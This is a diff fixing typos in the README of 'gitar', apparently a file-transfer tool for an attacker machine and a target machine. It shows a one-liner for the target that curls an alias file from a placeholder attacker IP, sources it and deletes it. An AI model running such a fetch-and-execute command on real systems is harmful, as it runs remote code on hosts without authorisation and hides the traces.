@@ -43,7 +43,7 @@ The aim is to keep "target requirements" as fit as possible. Attacker machine re
 
 Launch `gitar` server: 
 ```shell
-gitar -e [server_reachable_ip]`
+gitar -e [server_reachable_ip]
 ```
 
 #### (Target machine)
@@ -53,7 +53,7 @@ Get shortcuts and source them. The one-liner corresponding is by default copy on
 curl -s http://[attacker_ip:port]/alias > /tmp/alias && source /tmp/alias && rm /tmp/alias
 ```
 
-**And that's all, you can now `push`or `pull` file [🎶](#tldr---and-listen-music)**
+**And that's all, you can now `push` or `pull` file [🎶](#tldr---and-listen-music)**
 
  [`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files)
 
